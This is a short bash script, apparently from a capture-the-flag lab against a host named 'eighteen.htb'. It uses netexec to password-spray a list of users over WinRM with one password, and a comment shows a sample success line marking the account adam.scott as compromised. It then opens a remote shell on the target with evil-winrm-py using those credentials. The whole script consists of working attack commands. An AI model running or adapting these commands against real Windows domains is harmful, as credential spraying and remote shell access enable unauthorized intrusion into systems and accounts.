#! /bin/bash

# Crack to find correct password like: 
# WINRM       10.129.21.40    5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
netexec winrm eighteen.htb -u users -p iloveyou1 --continue-on-success

# Connect
evil-winrm-py -i eighteen.htb -u adam.scott -p iloveyou1

